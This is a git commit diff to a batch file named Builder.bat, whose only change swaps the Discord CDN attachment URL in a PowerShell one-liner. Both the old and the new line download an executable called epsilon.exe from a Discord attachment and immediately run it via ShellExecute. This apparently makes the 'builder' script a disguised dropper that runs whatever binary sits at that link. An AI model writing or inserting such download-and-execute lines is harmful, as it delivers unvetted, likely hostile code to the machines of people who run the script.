ed9a6c6f1fd062750bc985e1024ecb1f8e6e29fb
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-02-11 12:48:19 +0100

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -1,6 +1,6 @@
 @echo off
 cd Components
-powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1205200361816588309/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206204999433068564/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cls
 cd ..
 cd /d %~dp0
